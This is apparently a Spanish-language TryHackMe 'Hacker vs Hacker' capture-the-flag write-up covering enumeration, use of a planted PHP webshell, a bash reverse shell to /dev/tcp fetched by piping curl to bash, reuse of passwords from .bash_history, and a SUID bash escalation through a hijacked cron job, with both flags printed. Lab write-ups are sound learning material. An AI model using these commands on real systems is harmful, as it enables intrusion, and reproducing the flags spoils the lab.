@@ -1,0 +1,103 @@
+Tryhackme
+Hacker vs Hacker
+
+Escaneo con nmap:
+
+nmap -p- -sS -sC -sV --open --min-rate 5000 -vvv -n -Pn -T3 10.10.215.199 -oN hackervshacker
+
+• 22/tcp open ssh syn-ack ttl 64 OpenSSH 8.2p1 Ubuntu 4ubuntu0.4 (Ubuntu Linux; protocol 2.0)
+• 80/tcp open http syn-ack ttl 64 Apache httpd 2.4.41 (Ubuntu)
+   |_ http-server-header: Apache/2.4.41 (Ubuntu)
+
+Puerto 80:
+Una página donde aparece un celular.
+
+Fuzeo:
+
+gobuster dir -u http://10.10.215.199 -w /usr/share/wordlists/dirbuster/directory-list-lowercase-2.3-small.txt
+
+• /images
+• /css
+• /cvs
+• /dist
+• /#contact-us
+
+gobuster dir -u http://10.10.215.199/cvs -w /usr/share/wordlists/dirbuster/directory-list-lowercase-2.3-small.txt
+
+• Sin resultados
+
+gobuster dir -u http://10.10.215.199/cvs -w /usr/share/wordlists/dirbuster/directory-list-lowercase-2.3-small.txt -x .php
+
+El comando "-x" especifica la extensión que estamos buscando.
+
+• Sin resultados
+
+gobuster dir -u http://10.10.215.199/dist -w /usr/share/wordlists/dirbuster/directory-list-lowercase-2.3-small.txt -x .php
+
+• Sin resultados
+
+gobuster dir -u http://10.10.215.199/ -w /usr/share/wordlists/dirbuster/directory-list-lowercase-2.3-small.txt -x .php
+
+• /upload.php
+
+/upload.php: muestra una página con el siguiente mensaje:
+"Hacked! If you don't want me to upload my shell, do better at filtering!"
+
+Cuando intentamos subir un archivo a /#contact-us, nos redirige a /upload.php. Intentamos subir un archivo .php.pdf y también nos redirige a /upload.php. Es posible que ya haya una webshell subida, ya que el mensaje encontrado indica que hay una shell. Intentamos fuzzear archivos como "http://10.10.215.199/FUZZ.pdf.php", ya que las reverse shells se suben mediante PHP.
+
+wfuzz -c --hc 404 -w /usr/share/wordlists/dirbuster/directory-list-lowercase-2.3-medium.txt -u 'http://10.10.5.182/cvs/FUZZ.pdf.php'
+
+-c: Esta opción indica a wfuzz que muestre los resultados en un formato de tabla que facilita la lectura y comprensión.
+--hc 404: Esta opción le dice a wfuzz que ignore las respuestas HTTP con el código de estado 404.
+-w: Indica la lista de palabras.
+-u: Indica la URL.
+
+Luego de muchos intentos (reiniciando la máquina se resolvió el problema), encontramos la carpeta:
+• /cvs/shell.pdf.php
+
+Al encontrar esta shell, podemos introducir código.
+
+http://10.10.75.201/cvs/shell.pdf.php?cmd=whoami
+www-data
+
+Ahora necesitamos obtener privilegios de root. Para eso, utilizamos la herramienta en línea "https://www.revshells.com/" para crear una reverse shell para el navegador. Como no funcionó con el navegador, creamos un servidor Python HTTP con el que enlazaremos la máquina víctima, creando una reverse shell en nuestro servidor.
+
+python3 -m http.server 80
+Creamos un archivo .html llamado "index.html" que contiene la reverse shell:
+"#!/bin/bash
+bash -i >& /dev/tcp/10.18.112.21/443 0>&1"
+
+En el navegador de la máquina víctima, introducimos:
+"curl (Mi IP) | bash"
+Esto enlaza con el servidor Python y intervenimos con Netcat por el puerto 443.
+
+Después de lograrlo (costó), ejecutamos "script /dev/null -c bash" para tratar la TTY, pero nos arroja un "nope".
+
+Buscando entre los archivos, encontramos user.txt sin permisos de root, por lo que obtenemos la flag de usuario:
+user: thm{af7e46b68081d4025c5ce10851430617}
+
+Dentro de la misma carpeta donde encontramos "user.txt" al ejecutar "ls -la", aparecen carpetas ocultas. Dentro de ".bash_history" encontramos algunas contraseñas:
+echo -e "dHY5pzmNYoETv7SUaY\nthisistheway123\nthisistheway123" | passwd
+
+Luego de encontrar esta contraseña, deducimos que el usuario admin es "lachlan", ya que así se llama la carpeta donde estaba esta contraseña. Procedemos a utilizar el puerto SSH que estaba abierto con el usuario y contraseña.
+
+SSH: ssh lachlan@10.10.43.249
+Contraseña: thisistheway123
+
+Ingresamos, pero después de 30 segundos, nos deniega el acceso.
+
+Investigando entre los archivos, uno en particular llama la atención porque está en la carpeta "lachlan" y tiene un nombre llamativo.
+
+vi /etc/cron.d/persistence
+
+Al hacerle un "cat", descubrimos que es un archivo que se ejecuta en bucle y que está bloqueando el acceso por el puerto SSH.
+
+* * * * * root /bin/sleep 11 && for f in `/bin/ls /dev/pts`; do /usr/bin/echo nope > /dev/pts/$f && pkill -9 -t pts/$f; done
+
+Para dar acceso, necesitamos cambiar los permisos del usuario. Se cambian de la siguiente manera:
+
+echo 'chmod u+s /bin/bash' > bin/pkill; chmod 777 bin/pkill
+
+Pegamos el comando anterior dentro del usuario SSH de "lachlan" y usamos el comando "-p" para evitar que nos denieguen el acceso. Al ejecutar "ls", encontramos la carpeta "root.txt".
+
+root: thm{7b708e5224f666d3562647816ee2a1d4}
